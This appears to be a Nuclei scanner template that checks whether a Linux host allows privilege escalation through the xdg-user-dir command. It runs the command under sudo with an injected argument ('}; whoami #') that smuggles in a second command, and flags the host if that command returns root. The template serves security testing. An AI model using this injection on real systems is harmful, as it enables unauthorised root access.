code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'xdg-user-dir ''}; whoami #''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo xdg-user-dir ''}; whoami #''

    '
id: privesc-xdg-user-dir
info:
  author: daffainfo
  description: 'The xdg-user-dir command is used to retrieve the path of a user''s
    special directories, such as the user''s home directory, desktop directory, download
    directory, and others, based on the XDG Base Directory Specification.

    '
  metadata:
    max-request: 3
    verified: true
  name: xdg-user-dir - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/xdg-user-dir/
  severity: high
  tags: code,linux,xdg-user-dir,privesc,local
self-contained: true
